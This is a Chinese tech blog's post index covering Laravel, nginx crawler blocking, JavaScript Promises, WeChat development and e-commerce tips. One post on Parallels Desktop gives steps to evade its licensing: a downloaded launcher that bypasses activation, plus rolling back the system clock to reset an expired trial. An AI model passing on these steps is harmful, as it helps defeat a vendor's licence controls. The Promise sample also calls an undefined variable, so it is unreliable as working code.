写博客最麻烦的就是图片图片外链的问题了，之前也尝试过七牛云存储,新浪云，亦或者是自己把图片上传的博客根目录下的source 文件夹内等等，最终仍然无法解决快捷写博客的痛点。因为通常我们都习惯在文章中放几张截图，比如代码异常报错信息。通常以往的操作都是保存截图到本地，然后上传到七牛云或者github或者码云 ,这期间必须要把图片保存下来才可以生成一个图片外链。实在是太麻烦了，今天我就给出一个新的解决方案！\n\n<!-- more -->\n\n效果展示![在这里插入图片描述](https://img-blog.csdnimg.cn/d3ea2bb532b142fab7bbb2511c6cdd93.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n最近我发现在CSDN 写博客倒是挺方便的啊，他的编辑器可以直接粘贴截图后自动生成markdown 图片，这样的话就大大方便了我们去生成图片上传的过程。而且还省去了购买云存储资源，实在是一个不错的方法/\n\n\n在CSDN 的编辑器写完文章后，直接复制到hexo 大功告成！","categories":["代码笔记"]},{"title":"hexo 实现主页每日一言功能","url":"/2021/09/08/20210908-7/","content":"\n[API]今日诗词 - 每日一句，一款优质的一言API\n每次返回一句诗词\n根据时间、地点、天气、事件智能推荐\n支持图片和 JSON 格式调用，一分钟快速部署\n\n<!-- more -->\n![在这里插入图片描述](https://img-blog.csdnimg.cn/6c45b4ee7d404573a43215994120026e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n## 图片形式调用\n> 调用地址为：https://v2.jinrishici.com/one.svg\n\n如果需要自定义图片的文字的大小、间距、颜色，可以在图片地址后面加参数。\n\n例如：\n> https://v2.jinrishici.com/one.svg?font-size=20&spacing=2&color=blue\n\n\n## 文字形式调用\n\n第一步 ，你需要在网站的 </body> 之前放置快速加载 JS 文件：\n\n<script src=\"https://sdk.jinrishici.com/v2/browser/jinrishici.js\" charset=\"utf-8\"></script>\n\n第二步，在你需要放置诗词的地方，直接复制下面的代码到需要插入的地方：\n\n<span id=\"jinrishici-sentence\">正在加载今日诗词....</span>\n## \n\n这个网站推荐 https://www.jinrishici.com/ 有很详细的文档\n![在这里插入图片描述](https://img-blog.csdnimg.cn/96ef02f6c5484beba2754afe6bdaa2ad.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n","categories":["代码笔记"]},{"title":"hexo 实现主页每天自动更新一个背景图","url":"/2021/09/08/20210908-6/","content":"\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/d46e128e1f3b463fb75435f49bad84b3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n\n实现的方法其实很简单，用的是必应提供的一个免费的接口。\n该接口每天会自动更新一张美图，我们把这个接口用作我们网站的背景图，即可实现每日自动更新一个背景！是不是很方便啊！\n\n<!-- more -->\n## 必应每日一图API\n图片来源是bing每日一图。\n每天给用户提供一张不同的图片，每个月有一个属于自己的主题。支持https。\n\napi地址：https://api.mfstudio.cc/bing/\n\n效果展示\n![在这里插入图片描述](https://img-blog.csdnimg.cn/c83ac4a5fc8f4d7ca75b91c0587277b8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n### 应用举例\n\n我是在我的hexo 博客的根目录下 `_config.yml` 文件中配置的，如下\n```\nbg_image:\n    enable: true\n    # In theme directory (source/images): /images/avatar.png\n    # In site directory (source/uploads): /uploads/avatar.png\n    # You can also use a link of image. 接口地址\n    url: https://api.mfstudio.cc/bing/\n```","categories":["代码笔记"]},{"title":"JavaScript Promise 对象的使用","url":"/2021/09/08/20210908-5/","content":"\n\n> ECMAscript 6 原生新增了 Promise 对象\n\n下面我们来一起看一看 Promise 的用法和使用场景\n\n## 1、Promise 的作用是什么？\n> 简单理解：它是用来处理异步操作的，用来传递异步操作的消息\n\n<!-- more -->\n\n1.1 下面我们来看一段代码\n```javascript\n//resove和reject 是形参，可以自定义参数名\nvar myPromiseDemo = new Promise(function(resolve,reject){\n//这里写需要异步执行的函数,如果testFun() 方法执行完成,会调用形参resove函数返回testFun 返回结果，否则调用reject函数\n//模拟异步\n\tsetTimeout(function(){\n\t\tvar myDate = testFun();\n\t\t//返回数据\n\t\tresolve(myDate);\n\t},1000);\n});\n\n//调用我们定义的 Promise\nmyPromise.then(p=>{\n//接收异步函数返回结果，这里会打印出testFun函数的返回值\n\tconsole.log(p);\n});\n\n//自定义测试函数\nfunction testFun(){\n\treturn '测试函数返回数据';\n}\n```\n\n\n### 2、Promise 优缺点\n> 有了 Promise 对象，就可以将异步操作以同步操作的流程表达出来，避免了层层嵌套的回调函数。此外，Promise 对象提供统一的接口，使得控制异步操作更加容易。\nPromise 也有一些缺点。首先，无法取消 Promise，一旦新建它就会立即执行，无法中途取消。其次，如果不设置回调函数，Promise 内部抛出的错误，不会反应到外部。第三，当处于 Pending 状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。","categories":["代码笔记"]},{"title":"Laravel DB::transaction 方式如何传参","url":"/2021/09/08/20210908-4/","content":"\n> 今天在使用 Laravel 的事务的时候，一直报变量未定义的错误\n\n\n```bash\n$order_id = 12;\n\nDB::transaction(function () {\n\t$tmp = $order_id;\n});\nUndefined variable: order_id\n```\n\n仔细一看，才发现这是个匿名函数\n\n<!-- more -->\n匿名函数\n所以正确的使用方式是\n\n\n```bash\n$order_id = 12;\n\nDB::transaction(function () use ($order_id) {\n\t$tmp = $order_id;\n});\n```\n\n参数写在哪里，第一个括号还是第二个括号\n这是第二次见到 PHP 的匿名函数，所以比较新鲜。。。\n\n看官方的示例\n\n```php\n// Closures can also accept regular arguments\n$example = function ($arg) use ($message) {\n    var_dump($arg . ' ' . $message);\n};\n$example(\"hello\");\n\nstring(11) \"hello world\"\n```\n\n可见，\n\n第一个括号里的参数是留给调用者的\n第二个括号，即 use 后的括号是用来继承上下文的\n","tags":["Laravel"],"categories":["Laravel"]},{"title":"Nginx 反爬虫","url":"/2021/09/08/20210908-3/","content":"\n\n\n> 今日头条蜘蛛疯狂抓取导致cpu爆满，这个蜘蛛真是太残忍了，抓取的频率太高了，而在今日头条内会屏蔽网站内的所有广告，所以这种抓取没什么用，都形成CC攻击了。\n\n<!-- more -->\n最近网站访问明显慢了很多，阿里云一整就给我网站拉进小黑屋，看了网站监控发现都是今日头条抓取，本来我没想管，但是抓取频率超过了基础防火墙而且CPU爆满\n\n禁止了立马好了。\n\n我的服务器是4H4G20M带宽，本来也就一千多人访问，通过监控软件查看居然达到了六万。太疯狂了\n\nnginx在站点的设置，配置文件中 server{ } 中添加\n\n```php\n#禁止爬虫工具的抓取\n    if ($http_user_agent ~* \"Bytespider|FISPIDER|YisouSpider\") {\n      return 403;\n    }\n```\nAppache:\n在伪静态里设置 这里以thinkphp为例！\n\n```bash\n<IfModule mod_rewrite.c>\nRewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$1]\n#禁止爬虫工具的抓取\nRewriteCond %{HTTP_USER_AGENT} \"^.*FISPIDER.*|.*YisouSpider.*$\" [NC]\nRewriteRule ^(.*)$ - [R=404,L]\n\n</IfModule>\n```\n配置完不用重启,就能生效!\n\n记录\n\n#禁止爬虫工具的抓取\n\n```bash\nif ($http_user_agent ~* \"Bytespider|FISPIDER|AhrefsBot|SemrushBot|MJ12bot\") {\nreturn 403;\n}\n```\n","tags":["Ngnix"],"categories":["代码笔记"]},{"title":"Laravel 自定义公共函数报错 Call to undefined function App\\Http\\Controllers\\success()","url":"/2021/09/08/20210908-2/","content":"\n今天在写PHP的时候遇到了一个不曾有过的问题，就是在项目应用下写个公共文件，在控制器内能够访问到的，但是今天写了这个之后控制器不能访问，于是就开启了解决问题的道路。\n\n<!-- more -->\n这个主要就是需要配置一下，打开你项目的composer.json文件，然后在autoLoad里面添加上你的公共文件路径：\n\n```bash\n\"autoload\": {\n     \"psr-4\": {\n         \"App\\\\\": \"app/\",\n         \"Database\\\\Factories\\\\\": \"database/factories/\",\n         \"Database\\\\Seeders\\\\\": \"database/seeders/\"\n     },\n     \"files\":[\n         \"app/common.php\"\n     ]\n },\n\n```\n然后再执行一下：composer dump-autoload 就OK了\n\n完美解决~","tags":["Laravel"],"categories":["Laravel"]},{"title":"laravel Table ‘users‘ already exists","url":"/2021/09/08/20210908-1/","content":"\n## 标题报错如下图\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210603110244962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI4NTkwODc5,size_16,color_FFFFFF,t_70#pic_center)\n<!-- more -->\n\n## 标题解决方案：\n```bash\npublic function up()\n    {\n        Schema::dropIfExists('users');//增加这一条语句，即可解决问题\n        Schema::create('users', function (Blueprint $table) {\n            $table->id();\n            $table->string('name');\n            $table->string('email')->unique();\n            $table->timestamp('email_verified_at')->nullable();\n            $table->string('password');\n            $table->rememberToken();\n            $table->timestamps();\n        });\n```\n","tags":["Laravel"],"categories":["Laravel"]},{"title":"laravel socket 实现万物互联","url":"/2021/09/07/20210901/","content":"\nlaravel socket 实现万物互联\n\n<!-- more -->\n![](https://ably.com/packs/media/assets/home/publish-subscribe-with-presence-76e2a9920ed917be3f9e2157d624239f.svg)\n\n","tags":["Minitab"],"categories":["Minitab"]},{"title":"Laravel 模型取出来的时间和数据库存储的时间不一致","url":"/2021/07/09/20210903-1/","content":"\nlaravel 模型取出来的时间和数据库存储的时间不一致\n\nlaravel 8 默认的时区是 美国时间，需要手动在.ENV 这样增加配置\n\n```php\nAPP_TIMEZONE=PRC\n\n```\n\n<!-- more -->\n\n","tags":["Minitab"],"categories":["Minitab"]},{"title":"Minitab 二次开发实时生成控制图","url":"/2021/06/29/20210629-1/","content":"\n> minitab 是一个非常不错的数据分析软件，简单易用，功能强大！有兴趣可以[下载试用](https://www.minitab.com/zh-cn/support/downloads/)\n\n本文将介绍如何通过调用 Minitab 接口实现实时spc 控制图\n\n<!-- more -->\n\n![](https://techmax.com.cn/uploadfile/2021/0226/20210226105352646.jpg)\n\n<video src='https://techmax.com.cn/public/spc.mp4' type='video/mp4' controls='controls'  width='100%' height='100%'>\n</video>","tags":["Minitab"],"categories":["Minitab"]},{"title":"Parallels Desktop 目前最佳永久使用方法","url":"/2021/06/24/20210624-1/","content":"\n\n![](/img/1624428314-9db85a4e0bd4035.jpg)\n\n\nPD免激活最新方法\n\n本教程支持苹果Intel机型，也支持M1机型\n\n \n\n### 第1步：下载并安装PD专业版，最新版软件：https://www.parallels.cn/directdownload/pd/\n\n<video src=\"https://www.parallels.cn/fileadmin/res/video/pd/pd17/InstallPD.mp4\" autoplay loop muted></video>\n\n———————————————-\n\n### 第2步：安装 pd 安装程序后，在程序内下载windows 10\n\n![在这里插入图片描述](https://www.parallels.cn/fileadmin/res/img/pd/2021/trial/create_new_cn@2x.png)\n\n\n\n\n### 第3步开始安装\n\n<video src=\"https://www.parallels.cn/fileadmin/res/video/pd/pd17/InstallWin.mp4\" autoplay loop muted></video>\n\n———————————————-\n\n### 第4步：安装win10 引导插件\n\n- 在苹果系统下，安装这个工具：链接: https://pan.baidu.com/s/1SvDms-IVJjhmRJeZ8eoi6A 提取码: nxju\n\n- 关闭虚拟机，运行这个蓝色图标的Windows 10小工具可以直接进入（拖动Windows 10图标到右边文件夹中）\n\n![](/img/20210907-1.png)\n———————————————-\n\n### 第5步：后台关闭 PD软件，运行程序中的那个蓝色图标的Windows 10工具，可以直接进入Win10系统，注意是蓝色图标的那个哦，不要选错了。\n\n（以后不用运行PD了，直接运行这个工具直接进入Windows，可以脱离PD管控）\n\n———————————————-\n\n# 故障分析：\n\n①如果提示文件损坏，记得在系统偏好设置—安全和隐私中允许这个程序\n②如果出现`英文提示框报错`，只有两个原因：其一是你的PD并非专业版，其二就是你的虚拟机名称并非 Windows 10，请重命名，注意大小写。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/1d97740dbdb44e49a429854dba225269.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n这个报错解决方法：打开系统设置->安全性与隐私\n![在这里插入图片描述](https://img-blog.csdnimg.cn/35f2c3bf269540ae8118feb5e9e4fe81.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/55e5e23d977847a490b191005fcfc4f7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_17,color_FFFFFF,t_70,g_se,x_16)\n\n这个报错的解决方法：需要先激活pd 14 天免费试用后即可！\n\n\n## 注意！如果试用已过期，去把系统时间改成 2021年4月1号就可以了继续试用，试用后把PD退出，系统时间改回来，再用启动器启动即可。\n\n> 关于启动后出现试用窗口：\n如果启动后出现试用窗口，你只需要将系统时间修改为 2021年4月1号，然后运行一下 PD，当出现试用窗口时，点击继续试用，然后再将系统时间改回来，再用启动器启动即可。\n\n\n英文报错提示：Failed to start the VM: This product was activated for a limited period of time that has now expired. Purchase a new activation key (https://www.parallels.com/buy-pdfm17-zh_CN/) to continue using Parallels Desktop.（255）\n\n如果运行PD一键启动器，出现以上报错，是因为更新了PD17.1的导致的，以下是解决办法：\n\n## 方案：\n\n请下载安装这个PD版本：https://cloud.189.cn/web/share?code=mMvyEzMV77Fv（访问码：ld14）\n\n不会影响你当前的虚拟机文件，安装好后。双击运行Parallels Desktop程序，如果提示有新版本可以用，我们不要点 “下载与安装更新” 按钮，而是直接关闭窗口，然后点击 “不，使用现有的” 按钮，输入安装密码即可。\n\n启动后，我们右键Dock栏的PD图标，选择偏好设置—通用，把检查更新设置成从不，把自动下载更新的勾去掉，可以永久使用这个版本。\n\n\n\n> 温馨提示：\n注：以后虚拟机关机后，运行我们的引导工具，会直接进入虚拟机系统，可以脱离PD激活管控。如果虚拟机暂停或者休眠，不用关闭窗口，也可以运行这个蓝色小工具进行唤醒。PD软件还是需要的，因为虚拟机装在PD软件里的，那个小工具只是脱离了激活管控，直接启动虚拟机系统，过期依然有效。虚拟机在暂停休眠状态，也是可以用那个小工具进行唤醒的，也就等于你要运行两次小工具\n","tags":["Mac"],"categories":["Mac"]},{"title":"Laravel8 配置修改不生效，缓存问题解决方案","url":"/2021/06/23/20210623-2/","content":"\nLaravel 发布到服务器上之后，后面修改了配置后，页面读取的还是旧的配置。 最终问题解决是通过执行如下命令清除配置缓存\n\n<!-- more -->\n\n```php\n\nphp artisan config:clear\n\n```\nhttps://laravel.com/docs/8.x/deployment#optimizing-configuration-loading\n\n\n\n这个问题在官网文档已经说明，仔细阅读文档\n\n\n> When deploying your application to production, you should make sure that you run the config:cache Artisan command during your deployment process:\n\n```php\nphp artisan config:cache\n\n```\n\n> If you are building a large application with many routes, you should make sure that you are running the route:cache Artisan command during your deployment process:\n\n```php\nphp artisan route:cache\n\n```\n\n","tags":["Laravel"],"categories":["Laravel"]},{"title":"微信公众号token 验证失败解决方案","url":"/2021/06/23/20210623-1/","content":"\n最近在做微信公众号开发的时候遇到一个token 验证失败的问题，折腾了好久。最终解决了。这里特别记录一下，给接下来的小伙伴填坑，少走弯路。\n\n<!-- more -->\ntoken 验证失败 其实官网论坛发现遇到这个问题的人有很多，我最终是把 https 换成 http 之后，微信服务器验证通过。\n\n\n估计是我用的是证书不行吧，后来我又试了宝塔上面的免费证书，也没有任何问题！\n\n微信公众号开发，推荐使用 easyWechat 这个框架，简单易用。\n\n\n\n","tags":["微信公众号"],"categories":["微信公众号"]},{"title":"数据科学","url":"/2020/07/14/20200715-1/","content":"数据科学最近成为计算机的热门领域。数据科学是利用计算机的运算能力对数据进行处理，从数据中提取信息，进而形成“知识”。它已经影响了计算机视觉、信号处理、自然语言识别等计算机分支。数据科学已经在IT、金融、医学、自动驾驶等领域得到广泛使用。(如果你熟知中情局的棱镜泄密事件，你会发现数据科学已经在情报领域广泛使用。)\n\n<!-- more -->\n\n近期的工作一直在研究统计学软件，对数据分析领域略有研究。才发现统计怎么让用户的数据会说话。统计用样本估计总体，用模型预测未来。\n\nMinitab 软件本身开放的是C# 的COM 组件接口，一般的开发者可以通过C# 调用Minitab 的数据分析能力。这种COM 组件的是无法被WEB程序调用的。于是我经过一点时间的研究，写了一个 Windows 服务，开机后自动运行。然后不断的请求一个http 接口，进行获取数据。该接口中可以定义很多变量作为参数，比如，分析类型，子组大小，判异原则等。\n\nwindows 服务接受到数据和参数后，会自动调用Minitab COM 组件接口进行统计分析，生成相应的分析图行和文字说明。\n\n\n前端每次调用web接口的时候，必须传递一个唯一标识OrderID,实际上就是向数据库写入一条记录。之后前端在循环查找OrderID的结果。","tags":["生活笔记"]},{"title":"微信小程序入门唠嗑第一课","url":"/2018/11/26/20181126/","content":"### 如何理解微信小程序\n\n在学习微信小程序开发之前，首先我们要大致了解一个概念。微信小程序和传统安卓在手机上的程序（App) 有什么区别？\n\n<!-- more -->\n\n**传统手机APP**：有独立的安装包，必须安装在手机上才可以使用！\n**微信小程序**：依赖于微信APP，必须在微信内部才可以使用！\n\n微信小程序其实啊，它并不是新兴产物。早在5年前的 `html5` 时代就已经开始孕育了。为啥这么说呢? 客观不要着急，你先吃点瓜子点心，且听我给你慢慢道来！\n\n如果你平时玩手机比较细心的话，你可能会发现。当我们在微信或者朋友圈点开一个链接的时候。有些链接跳转过去竟然是一个无与伦比美丽的APP，比如在微信里打开京东的网站（jd.com)\n![京东](/img/20181126-2.jpg)\n**这是微信内部打开的京东商城**\n\n![京东](/img/20181126-3.png)\n**这是京东APP打开的京东商城**\n\n一个是微信内部打开的京东首页，一个是京东APP打开的京东首页。是不是二者几乎没有差别。我记得好像微信内部一直都有为京东提供这样一个特殊服务。（刘强东到底和马化腾做了什么PY交易，微信对京东这些年的支持从来就没断过）。从京东在微信内部这个以与众不同的平台来分析，你就会明白其实微信小程序这个如意算盘早就在谋划了。这就好像马云曾经公开针对京东说的一句能够让刘强东听了吐血的话，\n> 阿里巴巴的存在即是为了培养更多的京东\n\n**刘强东：nmmp。。。。**\n\n\n实际上京东和阿里是两个势均力敌的竞争对手！\n\n这也就是为什么这么多年来，微信里面只有京东网站而淘宝的网站链接每次点击都是访问失败！让你复制到浏览器打开的原因。\n你在微信里面买东西，不管是在京东，拼夕夕，唯美会，聚美优品....什么什什么付款的从来都没有支付宝支付的选项。有时候你确实微信里没钱，想用支付宝，这就很尴尬了。（这个时候我就会打开微信朋友圈，看看谁最新发布了动态，然后找他微信借钱2333333.）\n\n好了，牛逼越哈越远了。回到我们今天的主题！微信小程序到底是不是程序？\n\n>核心理念：\n小程序是一种不需要下载安装即可使用的应用，它实现了应用『触手可及』的梦想，用户扫一扫或搜一搜即可打开应用。也体现了『用完即走』的理念，用户不关心是否安装太多应用的问题。应用将无处不在，随时可用，但又无需安装卸载。\n微信创始人：张小龙\n\n\n我的答案：勉强算是小程序吧，但绝对不是APP！\n\n小程序这个叫法，其实就是微信内部一厢情愿的叫法。后来树大招风，店大欺客。没办法，人家在自己内部制定了一个规则，并且取名一个一个新的语言叫做\n①WXML(WeiXin Mark Language，微信标记语言)\n②WXSS(WeiXin Style Sheet，微信样式表)\n\n③JS作为小程序的逻辑语言(Java，小程序的主体)\n\n如果你之前的前端基础比较好的话，你对于微信小程序学习起来上手会非常快！\n\n## 小程序简要分析\n![小程序目录结构分析](https://ws2.sinaimg.cn/large/9ac1c132jw1f89ht2sqa0j21640p0q8y.jpg)\n\n- 全局配置文件\n![全局配置文件](https://ws3.sinaimg.cn/large/9ac1c132jw1f89htxlj2wj20rb09sjs4.jpg)\n\n\n## 小程序的优点\n\n- 比传统的 Hybird 应用在操作体验上，它具有更快、更流畅的应用体验，摆脱混合应用对浏览器性能的依赖且能够调用系统原生接口，有一定的数据缓存能力。\n- 比 React Native 类应用，更轻量级。\n- 比 Native App ，则胜在开发周期短、投入成本低、使用便捷，且依托微信庞大的用户基础和粘性，可以迅速引流，验证产品模式和用户需求。\n\n## 小程序的缺点\n\n- 目前限制应用包大小为 1024 kb 。\n- 微信开放接口 API 较少。\n- 仅限于小应用的能力，想要实现复杂应用能力上还不足。\n- 在多层级使用场景以及需要跳转类的需求上劣势明显。\n- 不支持 A 标签，无法打开普通网页。\n\n## 总结\n小程序在开发上不具有太高难度，更要考量的是作为产品或服务的设计和使用场景的优化上，微信小程序的真正优势在于开发成本低、更快速的迭代，可以快速测试用户需求，而不是技术上的颠覆。对于创业者和小公司来说，是一个快速启动的方式。但对于希望走的更远的企业，原生或 RN 类 APP 目前还绕不过去，微信小程序只能作为一个产品填补式的存在，当然这些还需要具体产品具体规划。\n\n通过上述信息我们可以这样认为，小程序是一个可通过 Web 技术栈开发，使用微信框架调用原生功能的类 Web 小应用，小体现在它本身的能力受微信的规则和框架的限制。这种形式仅仅在操作体验上优于传统 Hybird 开发的应用，与 React Native 开发复杂应用的能力要低太多，目前不在一个层次上。现阶段所展现的能力受限，随着用户和开发者的持续投入，微信也许会进一步释放它的能力，潜力较高。小程序如果在技术上可以获得强大的支持，对于低频应用（日历等小工具类以及其它形形色色的应用）或者应用使用场景（消费类浅层级应用使用场景）的补充，还是大有可为。\n\n## 学习方法\n\n虽然小程序是一种类前端的代码，能够让学习者上手非常快，大大的节约了学习成本。但是要想把小程序做的出类拔萃，则需要学习者具备扎实的前端基础以及过硬的 `js` 技术。\n小程序的开发架构也是最近比较流行的前后端分离的开发方式。后端程度提供一个数据接口为前端界面提供必要的数据支撑！前端也需要根据业务需要向后端发送数据请求！\n\n## 微信小程序文档\n- [你的第一个小程序](https://developers.weixin.qq.com/miniprogram/dev/#你的第一个小程序)\n- [微信小程序开发资源汇总](http://www.runoob.com/w3cnote/wx-xcx-repo.html)\n\n## 待续...\n哦，对了。给你讲个故事，从前有个人特别浪荡，他曾经说过这样一句话。\n> 如果哪一天你看到大街上一个戴着高礼帽黑礼服弹着吉他在演唱一首《当年情》的年轻人，那个人大概就是我了。请记得给我投一块钱。我这样开玩笑的和朋友说道。此时我的内心早已不能平静了。\n\n点击 [《生活虐我千百遍，我对生活如初恋》了解更多](https://blog.adymilk.cn/2018/05/27/20180512/)","tags":["微信小程序"],"categories":["代码笔记"]},{"title":"手淘首页的3大核心权重","url":"/2018/07/20/20180720-1/","content":"\n手淘首页流量的爆发是围绕三个核心权重来的。核心权重主要决定了我们的宝贝的一些基础数据。\n\n<!-- more -->\n\n![](/img/20180720-1.jpg)\n\n## 三大核心权重的第1个：点击率。\n\n如果连点击率都达不到要求的情况下，我们的宝贝是很难入池的。\n\n## 三大核心权重的第2个：收藏加购率和收藏加购量。\n\n收藏加购率和收藏加购量是决定我们宝贝是否能够获取到手淘首页流量de 第二大权重。只有收藏加购率和收藏加购量达到了行业爆款的均值，我们才能够持续地获取手淘首页流量、持续地往上增长。\n\n## 三大核心权重的第3个：宝贝的成交能力。\n\n我们的点击率优化得很好，我们收藏加购率也好，但是如果我们的宝贝只有流量不成交，这个时候我们手淘首页流量就会出现下滑的情况。\n\n这也是大家在单品有时候会遇到这样的情况，比如说上了淘抢购活动之后，因为短期内有大量的收藏架构，导致了活动结束之后的2到3天之内会爆发几千甚至过万的手淘首页流量了，最终因为转化成交能力的不足，就导致了手淘首页流量不能持续的增长。\n\n\n> 点击率\n\n点击率是决定宝贝是否能够入池的一个标准，要想宝贝入池就必须要达到行业的均值。\n\n\n\n因为我们主要是在猜你喜欢位置进行展现，这个位置，我们可以参考直通车流量解析工具推广词表下载下面有一个类目点击率，我们可以参考这个点击率，以我做猜你喜欢和手淘首页流量的经验看，用直通车定向推广的时候，我们的第一大要求就是我们单品在猜你喜欢的点击率必须要高于这个点击率！\n\n我对于我团队的要求是创意图的点击率必须高于这个点击率的1.5-2倍，大家记住如果你回去在操作的过程当中发现你的猜你喜欢的点击率是类目点击率的1.5到2倍，那你的猜你喜欢是一定能够做好的。这是第一步，我们必须要去优化点击率。\n\n很多同学会问到说：这个我的创意图点击率不高，不知道怎么去做一张高点击率的主图，怎么办？这里给大家一个参考：\n\n\n\n去生意参谋当中的流量排行榜，生意参谋市场行情，商品店铺榜的下面有个流量排行榜，在流量排行榜当中，它是按流量指数进行排序，一般情况下流量指数非常高的，都是手淘首页爆发很高的。这个时候大家可以去逐步的去查看整个排行榜的宝贝，逐个分析，如果看到了手淘首页流量很大的宝贝，学习他的主图设计就可以了。\n\n\n> 收藏加购率和收藏架构量\n\n第二大核心权重是收藏加购率和收藏架构量。我们要在单品从选款开始就要去关注这个指标，不光是手淘首页、搜索、包括活动都要去考核这个基础数据。在生意参谋的商品效果当中，我们可以去分析和计算出来我们店铺当前宝贝的收藏率和加购率。\n\n\n\n这里给大家强调一点：如果说是季节性很强的商品，我们可以参考最近7天数据；如果说季节性不强的标品，我们可以去参考最近30天的数据\n\n用加购件数除以商品的访客数，基本上可以大致算出宝贝的加购率；收藏人数除以访客数再乘以百分之百，就是宝贝收藏率。这两个指标要达到行业平均值。\n\n有同学会问行业平均值怎么算，是不是要去行业分析中分析，其实不用。就按照你店铺现有数据去进行对比，选择最优的宝贝再去优化。给大家分享一个优化的技巧：\n\n\n\n大家看这个宝贝，这个是类目第一，在宝贝主图的第3张，做了这样的1张主图：“收藏加入购物车，下单送好礼！”。大家记记住他写的是“收藏加入购物车，下单送好礼！”。有很多小店写的是“收藏加购，送xxx”，这个是违规的，想一下我就收藏加购，但是我不拍，你是不是把礼品送给我？\n\n记住，必须满足下单的条件。“因为赠品有限，请亲们收藏加购截图给客服登记，优先赠送发货。”\n\n第一让买家收藏加购，第二提升了客户的询单，同时也提升了宝贝的访问深度和停留时间！\n\n做了这样一张主图之后，这个店铺的老板跟我说，整个宝贝的收藏加购率在原有基础上提升了30%，所以说我建议大家在你的宝贝上都去做这样的活动。这是提升收藏加购率的一个小技巧。\n\n\n> 转化成交能力\n\n第三个核心指标是转化成交能力，也就是我们说的最多的产出。要想手淘首页流量持续地爆发或者持续稳定地增长，流量就一定要有产出，如果有流量不产出，那就是耍流氓。怎么去理解这句话，就是两个情侣天天在谈恋爱，最后没落实到实处，就是耍流氓。 \n\n\n\n大家可以看我给大家的截图，手淘首页的流量体量最大，但是转化率很低，支付转化率只有0.6。我们看中间的一段数据，他的收藏人数和加购人数非常的大。\n\n针对这种情况，我们和搜索对比完之后，我们发现它的转化率是低于搜索，但是手淘首页进来的流量最终转化我们要从购物车去进行转化，大家可以看到这张PPT当中购物车转化是10%，这样计算在手淘首页加购的2393个人当中，我们按10%来计算也可以成交接近240单。\n\n这个时候大家一定要坚持去做购物车的营销。强调两点，购物车营销它是影响单品最低价的，影响你的活动，所以说如果大家要上活动的宝贝要慎重。第二，多区间价多Sku的宝贝，不能做购物车营销。因为你一旦做了购物车营销，你的最高价Sku也会按照最低价Sku价格进行成交，他是直接一口价成交，他不是按照整个比例来的。\n\n那针对于要上活动，有多区间价的宝贝，如何去提升转化成交能力呢？我们可以利用店铺后台当中的客户运营平台中的智能营销工具，比如说短信的营销、兴趣客户的转化、优惠券的关怀以及专享价。\n\n专享价工具是针对于不同的标签人群的定向专享活动。好，简单举个例子，我们的一个宝贝正常的价格是100元，我们可以针对新顾客设置为100元，为了做老客营销，或者说针对于收藏加购的人群做二次营销，我们可以把它活动价设置为80元。\n\n当买家第一次进店看到我们宝贝是100元，当买家收藏或者加购之后，他在收藏和加购中重新来回到宝贝的时候，他看到的价格就是80元，这个时候对他的转化影响很大。这个工具不会影响最低价。\n\n\n> 总结\n\n这三大核心权重，大家记住它是依次排序，我们必须从第一个点击率开始去满足，只有点击率达到了行业标准以上，我们的宝贝才有可能在猜你喜欢位置上被推荐，结合我们的选品基础，收藏加购数据达标之后，我们手淘首页流量就能够增长。\n\n最终我们在收藏加购的用户中，在直接转化的用户当中，我们多做一些营销活动来提升我们整体单品的转化成交能力，提升我们单品的优惠价值，这样我们手淘首页的流量就能够持续的增长。","tags":["淘宝","电商"],"categories":["生活笔记"]},{"title":"人工智能Ai人脸融合技术","url":"/2018/06/30/20180630-1/","content":"\n## 体验地址(H5 手机端访问)\n[人工智能在线P图，只需一秒](http://0551shengteng.cn/FaceFusion/)\n\n<!-- more -->\n\n## 开源地址\nhttps://github.com/adymilk/FaceFusion\n","tags":["Ai","计算机视觉"],"categories":["代码笔记"]},{"title":"安装黑苹果系统是一种什么体验？","url":"/2018/06/26/20180624-1/","content":"\n## 安装前言\n\n我的笔记本电脑是神州K350C I5 D2,按照下面的方法可以实现在本机 Windows 和 Mac OS 双系统共存。\n<!-- more -->\n## 安装条件：\n\n目前市面上在 Pc 机上安装苹果系统有两种方式：\n\n\n用到 Mac Os 系统镜像，和一些工具\n\n## 系统镜像\n链接:https://pan.baidu.com/s/1Py-WqElRULD1iFTKLzCYUQ 